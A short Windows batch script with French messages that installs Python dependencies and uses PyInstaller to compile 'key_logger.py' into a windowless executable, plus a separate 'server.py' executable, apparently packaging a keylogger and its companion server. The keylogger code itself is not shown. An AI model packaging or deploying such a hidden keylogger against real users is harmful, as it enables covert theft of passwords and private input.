@echo off
echo ==========================
echo Installation des dépendances...
echo ==========================
pip install -r requirements.txt

if %errorlevel% neq 0 (
    echo Erreur lors de l'installation des dépendances.
    pause
    exit /b
)

echo ==========================
echo Compilation avec PyInstaller... (1/2)
echo ==========================

pyinstaller --onefile --noconsole key_logger.py

echo ==========================
echo Compilation avec PyInstaller... (2/2)
echo ==========================

pyinstaller --onefile server.py

if %errorlevel% neq 0 (
    echo Erreur lors de la compilation avec PyInstaller.
    pause
    exit /b
)

echo ==========================
echo Compilation terminée avec succès !
echo Votre fichier exe est disponible dans le dossier dist.
echo ==========================
pause
